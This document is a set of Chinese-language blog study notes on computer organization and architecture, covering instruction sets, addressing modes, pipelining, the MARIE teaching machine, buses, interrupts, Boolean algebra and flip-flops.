数据移动：可能有多种不同数据移动指令，如MOVER要求有两个寄存器操作数，而MOVE则使用一个寄存器操作数和一个存储器操作数。某些计算机体系结构如RISC，会限制将数据从存储器移出或将数据移到存储器，以加快运行速度。许多计算机有多种载入、存储和移动指令处理不同大小的数据，如LOADB处理字节数据，LOADW处理数据字。 算术运算：包括整数和浮点运算的各种指令，许多机器对不同大小的数据提供有不同的算术运算指令。 布尔逻辑运算：逻辑与、逻辑或、逻辑非、异或。 位操作（移位和循环换位）：在某个特定数据字中对一些单独数据位进行置位和复位操作，包括各种算术移位指令、逻辑移位指令和循环移位指令。逻辑移位指令对数据简单移位，反向补零；算术移位指令左移时不移动符号位，右移时符号位右移；循环移位各数据位移出后再反向移入。 输入/输出：程序控制的I/O，中断驱动的I/O，直接存储器访问（DMA）。 控制转移：分支转移（branch）、跳过（skip）、进程调用（procedure call）。分支转移分为条件转移和无条件转移，跳过指令是没有指定地址的分支转移指令，进程调用时一些特殊的分支转移指令，自动存储程序返回的地址，有的机器将这个返回地址存放在存储器某个特殊存储单元，有的机器将这个地址存放在某个寄存器中，有的则压入堆栈。 专门用途：如字符串处理指令，高级语言支持指令，保护和标志位控制指令，高速缓存指令等。 寻址方式 MARIE指令有一个12位操作数域，这个12位二进制数可以表示操作数的存储器地址，也可以是一个指示物理存储器地址的指针，也可以解释成其他内容。这样可以形成不同的寻址方式（addressing mode），寻址方式是指定指令中操作数位置的方法。实际操作数的位置称为操作数的有效地址。 立即寻址（immediate addressing）：指令中操作码后的数值会被立刻引用，例如Load 008会直接将数值8装入累加器AC中。不灵活。 直接寻址（direct addressing）：指令之直接指定要饮用的数值的存储器地址，如Load 008将存储器地址为008的存储单元中的数值作为操作数装入累加器AC。 寄存器寻址（register addressing）：采用寄存器而不是存储器指定操作数，指令的地址域包含一个寄存器的引用。 间接寻址（indirect addressing）：地址域中的二进制数指定一个存储器地址，将该地址中的内容作为一个指针。例如Load 008，该操作表示在存储器地址为008的存储单元中存放的数值实际上是要用到的操作数的有效地址。如果008单元存放的数值是2A0，则2A0是真实地址，操作将地址为2A0的存储器单元中的内容装入AC。间接寻址也可用做寄存器。 变址寻址和基址寻址（indexed addressing）：一个变址寄存器用于存储一个偏移量，将这个偏移量与操作数相加，产生实际的有效地址。如Load X中的操作数X采用变址寻址方式，假定R1为变址寄存器，如果R1中存放着1，则Load X寻找到的有效地址是X+1。基址寻址与变址寻址类似，但基址寻址使用基地址寄存器而不是变址寄存器，操作数域中的内容表示的是偏移量。这两种寻址方式在访问数组元素和字符串中字符时非常有效，大部分汇编语言都提供专门的变址寄存器。 堆栈寻址（stack addressing）：操作数假定放在堆栈中。 其他寻址方式：间接变址寻址（同时采用变址和间接寻址），基址/偏移量寻址（先将一个偏移量加到某个特定的基址寄存器中，再于指定的操作数相加产生有效地址），自动增/减量寻址等。 举例：假设指令Load 800、寄存器R1中数值为800。存储器结构如下：地址数值800900··· 9001000··· 1000500··· 1100600··· 1600700下表对于不同寻址方式给出实际装入累加器AC的值。寻址方式获取操作数方法装入AC的值立即寻址操作数数值直接包含在指令中800直接寻址指令的地址域是操作数的有效地址900间接寻址地址域的内容是实际操作数的地址1000变址寻址地址域数值与寄存器中数值相加产生有效地址700 指令流水线 计算机使用时钟脉冲精确控制各个操作步骤的顺序执行，有时可以使用额外的脉冲控制某个操作步骤中的小细节。现在所有的CPU都会将取指-译码-执行周期分为一些较小步骤，其中较小步骤可以并行执行，时间上的交叠可以加快CPU执行速度。这种方法称为流水线（pipeline）。 假设将取指-译码-执行周期分解为如下6个小步骤：S1取指令；S2操作码译码；S3计算操作数有效地址；S4取操作数；S5执行指令；S6存储结果，这是一个6级流水线，其中的每一个步骤称为流水线级（pipeline stage），将流水线逐级连接就构成指令执行的管道。假设现在有n条指令，k级流水线（本例的k=6）时钟周期时间为tp，即每级流水线需要tp时间。如果不采用流水线执行指令，则需要T = n × k × tp的总时间。如果采用流水线系统，一旦第一条指令的S1完成，该指令就会被送去执行S2，同时可以开始第二条指令的S1，当第二条指令执行S2时，第三条指令S1开始，第一条指令则执行S3，以此类推。因此执行第一条指令需要k × tp时间完成，之后的n - 1个任务每隔一个时钟周期就会从流水线中流出一个流水线级，因此剩下的总时间为（n - 1）×tp，利用k级流水线的总时间为T’=（k × tp）+（n - 1）×tp = （k + n - 1 ）× tp。获得的加速比S = T/T’，当n较大时，k + n - 1与n近似，因此n较大时S = k。流水线级数越多，计算机运行速度越快，从某种意义上说这一点是对的，但流水线控制逻辑的数量和大小也会随之增加，拖慢系统速度。另外还存在一些条件会导致“流水线冲突”，这些情况会阻碍计算机实现每个时钟周期执行一条指令的目标。条件包括：资源冲突、数据关联、条件分支语句。 资源冲突（resource conflict）：如果计算机正在将某个数值存放到存储器，同时又在从存储器中提取另一条指令，两个操作需要同时访问内存。通常解决方法是让存储指令继续执行，提取指令强制等待。某些冲突可以通过使用两条独立的通道来解决：一条通道从内存提取数据，另一条通道从内存提取指令。 数据关联（data dependency）：一条指令尚未结束，后续指令要求使用该指令的执行结果作为操作数。可以添加专门的硬件检测某条指令的源操作数是否是流水线上游的指令的目标操作数，这种硬件通过在流水线中插入一个no-op指令（不执行操作），让计算机有足够时间解决冲突。 条件分支转移：假设有一个4级流水线，S1=取指，S2=译码和计算有效地址，S3=取操作数，S4=执行指令和存储结果（假定该体系结构可以并行提取数据和指令，实际上大部分存储器系统将操作数放到高速缓存中，这样取指令和取操作数可以同时进行）。令指令I3是一个条件分支转移语句，使CPU不再执行I4～I7，而是直接跳转到I8。时钟周期123456789指令I1S1S2S3S4 指令I2 S1S2S3S4 分支指令I3 S1S2S3S4 指令I4 S1S2S3 指令I5 S1S2 指令I6 S1 指令I8 S1S2S3指令I9 S1S2从表格可以看出，CPU对I4～I6仍然进行了取指和接下来的各种操作，但实际执行I3后不需要I4～I7。这带来的结果是从第六到第九个时钟周期期间都没有指令流出，直到第9个时钟周期流水线才再次装满，而理想情况下一旦流水线管道开始装入指令，每个时钟周期都应该有指令流出。一种解决方法是设计分支预测机构，利用合理的逻辑对下一条指令做最优预测，编译器试图通过重新安排机器代码的方式产生延迟的分支转移操作。另一种方法是对某个已知的条件分支转移的两条分支通道都开始执行取指操作，并将结果存储，等到分支语句的实际执行时，需要执行的真实分支路径已经被计算过。 并行执行：并行指令计算机（EPIC）是一种完全不同的体系结构，采用非常大的指令（如Itanium为128位），该指令可以规定几个需要并行执行的操作。EPIC的指令系统强烈取决于编译器，安排操作的负担从处理器转移到编译器。并行执行有几种级别，几乎所有计算机都不同程度应用了并行概念，指令均使用字作为操作数，两个极端情形为程序级的并行执行（PLP）和指令级的并行执行（ILP）。PLP指一个程序各部分可以同时在多台计算机执行，ILP是在时间上重叠执行指令，分为两种类型，第一种将一条指令分解为多个步骤（流水线），第二种处理器本身就可以在同一时刻执行多条指令。ILP还有超标量体系结构，超流水线体系结构，超长指令字（VLIW）体系结构。 ISA体系结构真实案例 Intel体系结构：Intel使用的是小端、双地址的体系结构，采用可变长度指令系统，寄存器-存储器结构，操作数句长度可以是1，2，4字节。从8086到80486都是单级流水线体系结构，奔腾结构采用两条平行的5级流水线（U线和V线，不同级包括指令预取、指令译码、地址生成、指令执行、回写）执行，这些流水线都必须保持被填满状态，并行发出指令。奔腾II系列将两条流水线增加到12级，大部分新增加的流水线级用来支持Intel的MMX技术（Intel公司为处理多媒体数据对CPU体系结构功能的扩充）。奔腾III流水线增加到14级，奔腾IV增加到24级。Tntel处理器支持上述各种基本寻址方式，如8086有17种不同访问存储器方式。通常Intel体系结构各种寻址方式都保持向下兼容，但IA-64体系结构存储器只有一种寻址方式：寄存器间接寻址，遵循RISC设计思想，对特殊硬件需求减少到最少。 MIPS体系结构：小端、按字编址、3地址、采用固定长度，是装入/存储式体系结构。MIPS限制只有固定长度的操作，操作数句必须具有相同的字节数。某些MIPS处理器如R2000和R3000，有5级流水线。R4000和R4400有8级流水线。R10000处理器流水线级数取决于执行指令需要经过的功能单元：整数指令为5级，装入/存储指令为6级，浮点运算为7级。R5000和R10000都属于超标量体系结构。MIPS共有5种类型指令：执行简单算术操作指令、数据移动指令、控制转移指令、多重循环指令、其他杂类指令。MIPS指令系统只提供基地址寻址方式，其他编址方式由编译器提供。MIPS指令分为4个域，一个操作码域，两个操作数地址域和一个结果地址域；具有三种类型指令格式，I类型（immediate）、R类型（register）和J类型（jump）。R类型包括一个6位操作码、5位源寄存器、5位目标寄存器、5位偏移量和6位功能代码；I类型指令包括6位操作码、5位源寄存器、5位目标寄存器或分支转移条件、16位立即分支转移位移量或地址位移量；J类型指令包括6位操作码、26位目标地址。 Java虚拟机：与工作平台无关，实际运行在JVM（Java Virtual Machine）上，不同硬件机器的JVM不同，按照机器固有的指令集编写。JVM相当于解释程序：读取java字节码，将字节码解释成各种机器指令。对Java程序编译时，生成特殊字节码（bytecodes），这些字节码是JVM的输入源程序。编译语言如C、C++、Ada、FORTRAN、COBOL等通常具有很好的可执行性能，只能在特定的目标体系结构上运行。解释性编程语言如LISP、PhP和Tcl等与工作平台无关，但执行速度约比编译程序慢100倍。同时以两种形式存在的称为P代码语言，如Perl、Python和Java等，效率比编译程序语言慢5～10倍。Java虚拟机有4个寄存器，支持访问5各不同的主存储区区域，JVM是堆栈类型的机器，不提供通用寄存器。 专栏目录：计算机理论基础此专栏的上一篇文章：计组与体系结构笔记（三）：简单体系模型此专栏的下一篇文章：计组与体系结构笔记（五）：存储器相关 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2015/10/27/Computer-Organization-Architecture4/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"计组与体系结构","slug":"计组与体系结构","permalink":"http://forec.github.io/tags/计组与体系结构/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"计组与体系结构笔记（三）","slug":"Computer-Organization-Architecture3","date":"2015-10-21T11:26:38.000Z","updated":"2016-11-22T11:07:04.000Z","comments":true,"path":"2015/10/21/Computer-Organization-Architecture3/","link":"","permalink":"http://forec.github.io/2015/10/21/Computer-Organization-Architecture3/","excerpt":"简单的计算机体系模型。","text":"简单的计算机体系模型。 现代计算机微观体系结构CPU 中央处理器（central processing unit, CPU）负责提取程序指令，并对指令译码，之后按程序规定的顺序对正确的数据执行操作。CPU可分为两部分，第一部分为数据通道（datapath），是一种由存储单元（寄存器）和算术逻辑单元组成的网络，这些组件通过总线连接，并利用时钟控制时间。第二部分是控制单元（control unit），负责对各种操作进行排序并保证各种正确的数据适时地出现在所需的地方。 寄存器（register）位于CPU内部，用于存储二进制数据，前章介绍的D存储器可以用来构建寄存器，一个多位寄存器是一组D触发器的组合。通用寄存器大小为16位，32位，64位。某些寄存器会被赋予专门的用途，如只能存放地址、只用于存储控制信息等。寄存器的编址与存储器不同，每一存储器字都有一个唯一的二进制地址，这些地址从0开始编码，而仅存次则由CPU内部控制单元进行编址。 算术逻辑单元（arithmetic logic unit，ALU）在程序执行过程中用于进行逻辑运算和算术运算。一般情况为两个数据输入和一个数据输出。ALU中的各种操作常常影响状态寄存器（status register）的某些数据位的数值。控制单元发出的信号控制ALU执行运算。 控制单元（control unit）监视所有指令的执行和各种信息的传送过程。控制单元负责从内存提取指令，对指令译码，确保数据适时的出现在正确的地方，同时负责通知ALU应当使用哪一个寄存器，执行哪些中断服务程序。其使用一个程序计数器（program counter）的寄存器来寻找下一条要执行的指令的位置，并用状态寄存器存放某些特殊操作状态。 总线 总线（bus）是一组导电线路的组合，作为一个共享和公用的数据通道把系统内的各个子系统连接在一起，由多条线路构成，允许多位数据并行传递。 在任何时刻只能有一个设备（如寄存器、ALU、内存或其他某个设备）使用总线。这种共享总线的方式可能引起通信上的瓶颈。总线的速度受到总线长度和共享总线的设备数目的影响。更通常的情况：各种设备分为主设备（master）和从设备（slave），主设备为最初启动的设备，从设备为响应主设备请求的设备。 总线可以实现以点对点（point-to-point）的方式连接两个特定设备，或将总线作为一条公用通道（commmon pathway）来连接多个设备。要求多个设备共享的总线称为多点（multipoint）总线。总线协议（bus protocol）对于共享总线十分重要，典型计算机总线包含数据总线、地址总线、控制总线和电源线：数据总线（data bus）传递必须在计算机不同位置之间移动的实际信息；控制总线（control line）提示哪个设备允许使用总线和使用的目的，也用来传递有关总线请求、中断和时钟同步信号的响应；地址总线（address line）指出数据读写位置。 各种信息的传递都发生在一个总线周期（bus cycle）内，总线周期是完成总线信息传送所需的时间脉冲间的时间间隔。同步（synchronous）总线由时钟控制，各种事件只有在时钟脉冲到来时才会发生。总线周期与时钟频率成反比，要通过时钟控制事件的发生，因此任何时钟脉冲产生的相位漂移（clock skew）都不能过大，即总线周期时间不能短于信息在总线上传输所需要的时间，因此总线长度对总线的时钟频率和周期时间有一定限制。异步（asynchronous）总线负责协调计算机各种操作，采用握手协议强制实现计算机其他操作同步。 根据总线传递的信息类型和使用总线的设备，可以细分为：处理器-内存总线（processor-memory bus）为长度较短的高速总线，将CPU和内存系统使用最大限度的带宽连接，需要专门的设计；I/O总线通常比处理器-内存总线长，可连接不同带宽的设备，兼容多种不同体系结构；底板总线（backplane bus）构建在机器主板上，将主板上所有部件连接，即所有设备共享一条总线。对于PC机，使用内总线（系统总线）连接CPU、内存和所有其他内部部件，使用外总线（拓展总线）连接外围设备、拓展插槽和I/O端口。 总线仲裁（bus arbitration）：对于配备不止有一个主控设备的系统需要主线仲裁，为主控设备制定优先级别，保证各个主控设备都有机会使用总线。 菊花链仲裁方式：使用一条“出让总线”的控制线将总线使用权依次由最高级别向最低级别传递，简单但不能保证仲裁公平性。 集中式平行仲裁方式：每个设备有一个总线请求控制线，通过一个总线仲裁器选择设备。会导致使用过程中出现瓶颈效应。 自选择的分配式仲裁方式：由设备自己决定那个设备具有使用的最高优先级。 冲突检测的分配式仲裁方式：每个设备都允许发出总线使用请求，如果有冲突则这些设备都必须重新发出另一个使用请求。以太网采用这种方式。 时钟 用于对系统各个部件协调同步，CPU的每条指令执行都是使用固定的时钟脉冲数目。计算机采用时钟周期量度系统指令的性能。 多数计算机系统都是同步计算机：计算机只有一个主控时钟信号，按照规定的时间间隔发生脉动，各个寄存器必须等待时钟脉冲发生跃变才能输入新的数据。最小的时钟周期时间至少应大于数据从每组寄存器的输出到下一组寄存器的输入所需要的传递时间，即电路的最大传输延迟时间。可以通过在输出寄存器和对应的输入寄存器之间增加寄存器的方法减小传输延迟，增加额外的寄存器等价于增加该条指令所需的时钟周期的数目。一般的，乘法比加法操作、浮点运算比整数运算要更多的时钟周期。 某些总线结构有自己的时钟，总线时钟通常比CPU时钟慢，造成了系统的瓶颈问题。有时会为了达到目的超越某些技术限制，如超频（over-clocking）使部件超出规定给出的时间频率或总线速度上限，CPU是最流行的超频组件（许多部件都可以超频运行）。对系统总线的超频可以大幅度改善系统性能，但同样可能损害与总线相连的各种部件。 存储器组成和寻址方式 可以把存储器设想成一个数据位的方阵，方阵的每一行的位长度通常是机器的字大小。物理上通过一个寄存器实现存储器方阵的一行的数据存储。每个寄存器（存储单元）都有一个唯一的地址编号。存储器地址几乎都为无符号整数，正常情况下（目前流行的大部分）存储器采用按字节编址（byte-addressable），即每个字节有一个唯一的地址。有的机器的字大小超过一个字节（32位系统的每个字都是4个字节），可以采用按字编址（word-addressable），每个机器字有一个自己唯一的地址。字是计算机指令使用的基本单位，即使是按字节编址的计算机也可以从内存中直接读出一个字或将一个字写入存储器。 存储器（内存）由随机访问存储器（RAM）芯片构成，使用符号L×W（长×宽）表示，如4M×16存储器表示存储器有4M（2^22个字）长和16位宽（每个字都是16位）。要对该存储器编址需要2^22个不同的地址，即22位二进制数。主存储器使用的RAM芯片数目大于1,通常利用多块芯片拼接成一定要求的单一存储器模块。单一共享存储器模块可能引起存储器访问上的顺序问题，存储器交叉存储技术从多个存储器模块中分离存储单元，低位交叉存储使用地址的低位选择存储器组，把连续的存储器地址分配到不同的存储器模块中，高位交叉存储使用地址的高位选择存储器组，把地址直接分配给具有连续地址的存储器模块。 中断和输入/输出子系统 输入/输出是各种外围设备和主存储器（内存）之间的数据交换。中断（interrput）是改变或中断系统正常流程的各种事件。 输入/输出设备通常不与CPU直接相连，而采用某种接口（interface）来处理数据交换，接口将信号转化为总线和外设都可以接受的形式。CPU通过输入输出寄存器和外设交流，有两种工作方式：1）内存映射的输入输出（memory-mapped I/O），接口中的寄存器地址就在内存地址的分配表中，此时CPU对I/O设备的访问和对内存的访问完全相同，速度很快但要占用系统内存空间；2）指令实现的输入输出（instruction-based I/O），CPU有专门的指令实现输入输出操作。 如果采用键盘输入，并且打字的速度很快，计算机必须有足够的时间来阅读输入寄存器的每一个字符。如果在计算机能够有机会处理完当前的字符之前，又有另外一个字符被送入到输入寄存器，那么当前的那个字符就会丢失。一种更可能发生的情况是，由于处理器的速度非常快，而键盘输入的速度很慢，所以处理器可能会多次从寄存器重复读取同一个字符。可以使用中断控制的输入输出(interrupt-driven I/O)来解决上述这些问题。 多种原因可以触发中断：I/O请求，算术错误，算术下溢或上溢，硬件故障，用户定义的中断点（如程序调试），页面错误，非法指令等。不同中断类型的中断处理方法不同。由用户或系统发出（启动）的中断请求可以是屏蔽（maskable）中断（可以被禁止或忽略）或非屏蔽（maskable）中断（高优先级别的中断，不能被禁止，必须响应）。 计算机中有三种类型的中断：由外部事件（输入/输出，电源掉电等） 产生的外部中断；由于程序中的一些异常（被0除，堆栈溢出，保护系统侵犯等）产生的内部中断以及执行程序中的某条指令（例如，要求程序的执行从一种运行环境如用户层，转到另一个运行环境如内核层等）所引起的软件中断。 MARIE MARIE包含一个实际的工作计算机具备的全部功能部件，包括存储器和CPU。 体系结构、寄存器和总线 MARIE有以下特点：使用二进制数和补码表示法，存储程序和采用字长度，按字编址，主存储器容量为4K字，16位数据，16位指令、4位操作吗和12位地址，一个16位的累加器（AC），一个16位的指令寄存器（IR），一个16位的存储器缓冲寄存器（MBR），一个12位的程序计数器（PC），一个12位的存储器地址寄存器（MAR），一个8位的输入寄存器和一个8位的输出寄存器。 MARIE的7种寄存器 AC：累加器（accumalator）用来保持数据值，是通用寄存器。 MAR：存储器地址寄存器（memory address register），用来保持被引用数据存储器地址。 MBR：存储器缓冲寄存器（memory buffer register），用来保持刚从存储器中读取或者将要写入存储器的数据。 PC：程序计数器（program counter），用来保持程序将要执行的下一条指令的地址。 IR：指令寄存器（instruction register），用来保持要执行的下一条指令。 InREG：输入寄存器（input register），用来保持来自输入设备的数据。 OutREG：输出寄存器（output register），用来保持将要输出到输出设备的数据。其中，MAR、MBR、PC和IR寄存器为专用寄存器，不能作除上述规定外的其他目的。另外有一个状态或标志寄存器（status），保持显示各种状态信息。 MARIE的数据通道 指令系统体系结构 指令系统体系结构（instruction set architecture，ISA）规定了计算机可以执行的每条指令和其格式。 指令构成MARIE的每条指令由16位二进制数构成，最左边（12～15）4位组成操作码，右边12位（0～11）形成地址。00011Load X将地址为X的存储单元中的内容装入AC00102Store X将AC中的内容存储到地址为X的存储单元中00113Add X将地址为X的存储单元中的内容和AC中的内容相加，结果存入AC01004Subt X将AC中的内容减去地址位X的存储单元中的内容，结果存入AC01015Input从键盘输入一个数值到AC中01106Output将AC中的数值输出到显示器01117Halt终止程序的执行10008Skipcond有条件的跳过下一条指令10019Jump X将X的值装入PC中对于Skipcond，假定最靠近操作码的两位地址位作为测试的条件，如可以设定00为AC中的值为负数，01为AC中的值等于0，10为AC中的值大于0。 寄存器传输表示法：MARIE指令集实际是计算机部件用来执行程序的机器级别的指令系统，每条指令实际包含多个微指令（mini-instruction），又称为微操作。微指令规定了对寄存器中存储数据可以执行的各种最基本操作。描述计算机微操作的行为的符号表示法为寄存器传输表示法（RTN）或寄存器传输语言（RTL）。使用M[X]表示存放在地址为X处的存储单元中的数据，&lt;——表示信息的传送。实际操作中，数据先从源寄存器送到总线，然后脱离总线到达目的寄存器。下面叙述中没有包括总线的传送过程。Load XMAR&lt;——X，MBR&lt;——M[MAR]，AC&lt;——MBRStore XMAR&lt;——X，MBR&lt;——AC，M[MAR]&lt;——MBRAdd XMAR&lt;——X，MBR&lt;——M[MAR]，AC&lt;——AC+MBRSubt XMAR&lt;——X，MBR&lt;——M[MAR]，AC&lt;——AC-MBRInputAC&lt;——InREGOutputOutREG&lt;——ACHalt无Jump XPC&lt;——X 指令执行过程 取指-译码-执行（fecth-decode-execute）。整个过程如下。 将PC中的内容复制到MAR：MAR&lt;——PC。 CPU转向主存储器，提取由MAR给出的地址单元中的指令，并将指令放入指令寄存器IR，同时PC自动加1（MARIE按字编址，PC加一实际效果是下一个字的地址占据PC寄存器，如果MARIE按字节编制，则PC需要增量2,因为每条16位指令占据两个字节宽度），此时PC指向下一条指令：IR&lt;——M[MAR]，PC&lt;——PC+1。 IR最右边的12位地址复制到MAR，对IR最左边4位译码：MAR&lt;——IR[11-0]，IR[15-12]。 若需要，则CPU使用MAR中的地址转向存储器提取数据，并将数据放入MAR（可能是AC）中，然后执行指令。 MARIE的中断和输入/输出：当CPU要执行输入输出指令时，通知I/O设备，之后继续处理其它任务，直到I/O设备准备就绪，此时I/O设备会向CPU发送中断请求信号，CPU响应和处理这个中断请求，完成I/O操作后CPU会继续正常的取指-译码-执行周期。大部分计算机中断处理方法为：在机器的每一个取指-译码-执行周期开始处，检查是否有中断请求存在，如果有中断请求则CPU先处理中断任务，否则正常执行。在CPU执行中断服务程序前，必须存储PC中的内容，CPU的所有寄存器中的内容，以及原始程序中原有的各种状态条件。中断服务完成后，CPU必须严格恢复到原始程序运行的真实环境。 编译程序：编译程序使用助记符号将汇编语言转换成机器语言，即完全由二进制数组成的语句。编译程序阅读由汇编语言编写的源文件（source file），生成由机器代码组成的目标文件（object file）。可以使用标记符号label（简单名称）来标识或命名一些特定的存储器地址。MARIE要求标号后面必须要加一个“，”的标点符号。在第一次通读时，编译程序建立一组符号表（symbol table）表示对应关系。第二次通读时，编译程序使用符号表来填充空白地址，并且生成相应的机器语言指令。 简单MARIE程序 两数相加十六进制地址指令存储器地址二进制内容存储器十六进制内容100Load 1040001 0001 0000 01001104101Add 1050011 0001 0000 01013105102Store 1060010 0001 0000 01102106103Halt0111 0000 0000 0000700010400230000 0000 0010 00110023105FFE91111 1111 1110 1001FFE910600000000 0000 0000 00000000 MARIE指令集扩充指令编号（十六进制）指令意义RTN0JnS X将PC内容存储到地址X处，并跳转到地址X+1MBR&lt;——PC，MAR&lt;——X，M[MAR]&lt;——MBR，MBR&lt;——X，AC&lt;——1，AC&lt;——AC+MBR，PC&lt;——ACAClearAC清零AC&lt;——0BAddI X间接相加：将地址X处的数值作为操作数实际地址，加到AC中MAR&lt;——X，MBR&lt;——M[MAR]，MAR&lt;——MBR，MBR&lt;——M[MAR]，AC&lt;——AC+MBRCJumpI X间接转移：将地址X处的数值作为地址并无条件跳转到该存储单元MAR&lt;——X，MBR&lt;——M[MAR]，PC&lt;——MBR 硬件译码和微程序控制译码 硬连线控制（hardwired control）：物理上将各条控制线与实际的机器指令连接。速度快，电路复杂，设计修改困难。 微编程（microprogramming）：所有机器指令被放置到微程序中，将指令转换成规定的控制信号。微程序是一个用微代码编写的翻译器，被存储在计算机固件（ROM、PROM、EPROM等）中，称为控制存储器。设计灵活简单，有助于设计功能强大的指令集。每条指令都需要经过一次额外的翻译过程，会减缓整个程序执行速度。 实际计算机体系结构：CISC（复杂指令集计算机，Complex Instruction Set Computer），如Intel体系结构中的x86系列CPU，和RISC（精简指令集计算机，Reduced Instruction Set Computer），如Intel的奔腾系列和MIPS体系结构。CISC机器有数目庞大、长度各异、设计复杂的指令系统，多数指令非常复杂，这些复杂指令的一个小子集就可能显著减慢CPU运行速度。RISC机器主要目的是简化指令，对一些小的但是完整的指令硬连线，提高指令执行速度。在RISC系统中，每条指令只执行一个操作，所有指令长度相同只是格式略有差别，所有算术运算在寄存器之间执行，存储器中的数据不能用作操作数。1982年后，所有新设计的指令系统基本都属于RISC结构或CISC和RISC组合结构。 专栏目录：计算机理论基础此专栏的上一篇文章：计组与体系结构笔记（二）：布尔代数和数字逻辑此专栏的下一篇文章：计组与体系结构笔记（四）：指令系统 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/10/21/Computer-Organization-Architecture3/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"计组与体系结构","slug":"计组与体系结构","permalink":"http://forec.github.io/tags/计组与体系结构/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"计组与体系结构笔记（二）","slug":"Computer-Organization-Architecture2","date":"2015-10-14T10:54:17.000Z","updated":"2016-11-22T11:09:28.000Z","comments":true,"path":"2015/10/14/Computer-Organization-Architecture2/","link":"","permalink":"http://forec.github.io/2015/10/14/Computer-Organization-Architecture2/","excerpt":"整理第三章布尔代数，并加入一些数字逻辑的相关内容。","text":"整理第三章布尔代数，并加入一些数字逻辑的相关内容。 布尔代数 布尔表达式和布尔恒等式 布尔表达式（Boolean expression）由变量和算符组合，基础算符为AND、OR和NOT，称为与（布尔和）、或（布尔积）和非。下面用+，·和~表示三种运算符。 布尔恒等式：恒等式与形式或形式一致律1 · x = x0 + x = x零律0 · x = 01 + x = 1幂等律x · x = xx + x = x互补律x · ~x = 0x + ~x = 1交换律x · y = y · xx + y = y + x结合律（x · y）· z = x ·（y · z）（x + y）+ z = x +（y + z）分配律x + y·z =（x + y）·（x + z）x·（y + z） = x · y + x · z吸收律x·（x + y） = xx + x · y = x德摩根律~（x · y） = ~x + ~y~（ x + y ）= ~x · ~y需要注意的一个常见错误是认为~（x · y）= ~x · ~y。以下是几个在布尔表达式化简时常用的恒等式，使用时适当配项。还原律A · B + A · ~B = A（A + B）·（A + ~B）= A吸收律A ·（A + B）= AA ·（A + B）= A吸收律A ·（~A + B）= A · BA + ~A · B = A + B冗余律A · B + ~A · C + B · C = A · B + ~A · C 运算基本规则 代入规则：任何一个含有变量A的等式，如果将所有出现A的位置都代之以一个逻辑函数，则等式仍成立。 反演规则：求一个逻辑函数F的反码（非函数~F)，可将F中的与换成或，或换成与，原变量换成非变量，非变量换成原变量，1换成0，0换成1。要保持原式先与后或的顺序，二变量（含2）以上的非号不变。如F = A + ~（B + ~C + ~（D + ~E）），则~F = ~A · ~（~B · ~C · ~（~D · E））。 对偶规则：变量不变，其余和反演的规则相同。 通用门电路：常用的门电路是与非门（NAND）和或非门（NOR）。与非门也称万能门，可以构建所有的数字电路。下图给出用与非门实现与门、非门和非门的方法。使用与非门的电路成本低，并且在物理上构建复杂的集成电路时使用相同的结构模块比使用一些基本结构模块（与、非、或）的集合要容易的多。根据对偶原理，或非门也可以构建任意的数字电路。 数字电路元件 集成电路的电子元件直接在半导体芯片上腐蚀制成，与对等的分立器件相比，集成电路上的元件体积更小，工作时消耗的电能更多。 组合逻辑电路可以用来构建包含基本布尔算符，输入输出的数字电路，组合逻辑的输出完全取决于给定的输入值。 半加器（half-adder）：求和操作为异或函数，进位输出等价于一个与门。 全加器（full-adder）：求和的加法电路有三个输入（x，y和进位输入）。例如要制作16位字的全加器，只需要将下图所示电路复制16次。但因为运算速度慢，现实中不会采用这种方法实现加法运算，改进方法包括使用先行进位加法器，选择进位加法器和存储进位加法器等，目的都是缩短由于两个二进制数字相加的逐位进位过程造成的延迟时间。 译码器（decoder）：利用输入和对应数值选择某跟特定的输出线。下图是一个2-4译码器的电路构成。 多路复用器（multiplexer）用来从众多输入线中选择需要的二进制信息，然后直接用单一输出线输出。通过一组选择变量，或称为控制线，来控制选定某个特定的输入线，每个特定时刻都只有一个输入（被选中的输入）可以通过线路连到输出端，其他输入都会断开。分时共享的计算机和调制解调器网络都是使用多路复用器来分配终端。下图是一个简单的多路复用器的物理电路构成。 时序逻辑电路：对于组合逻辑电路，函数的输出值完全取决于函数的输入值，即没有记忆功能。时序逻辑电路的输出同时时当前的输入和之前的输入的函数，为了记忆之前的输入，时序电路必须具有某种存储单元，称之为触发器（flip-flop），触发器的状态是此前的电路输入的函数。 时钟信号：时序电路依赖过去的输入决定当前的输出，因此各种事件的发生必须有先后次序。有的时序电路是异步（asynchronous）的，意味着只要任意的输入值发生改变，这类电路就会被激活。同步（synchronous）时序逻辑电路则利用时钟来对各个事件进行排序。时钟能够产生一系列具有精确宽度和间隔的连续脉冲，脉冲间隔成为时钟的周期时间，速度一般用MHz衡量。大部分时序电路采用边缘出发（有的为水平触发），即电路的状态在时钟脉冲的上升边缘或者下降边缘发生改变。 触发器：水平触发电路只要时钟信号在高电平或者低电平时旧可以改变状态。锁存器（latch）属于水平出发类型，而触发器为边缘触发类型。时序电路通过反馈“记忆”过去的状态。可以通过特征表描述触发器，用Q（t）表示电路当前状态，Q（t+1）表示电路的下一个状态。 SR触发器：三个输入，S、R和当前的输出Q（t）。若S，R均为0，则Q（t+1）= Q（t）；若R = 1，S = 0，则Q（t+1）= 0（复位）；若R = 0，S = 1，则Q（t+1）= 1（置为）；S、R均为1未定义。下面是实际的SR触发器示意图。 JK触发器：以Jack Kilby命名，是对SR触发器的简单修改，防止了R、S同时为1的非法状态的发生，当J、K都为1时Q（t+1）= ~Q（t）。 D触发器（data）：D触发器是一个真实的计算机存储器单元，如果输入设置为1，则时钟脉冲到来时输出为1，如果输入为0，时钟脉冲到来时输出为0。作用在于时钟脉冲到来时才将数据送出，并且用边沿触发，防止外来干扰在数据传输时的影响。 典型时序逻辑电路：下图是一个4位寄存器的逻辑图 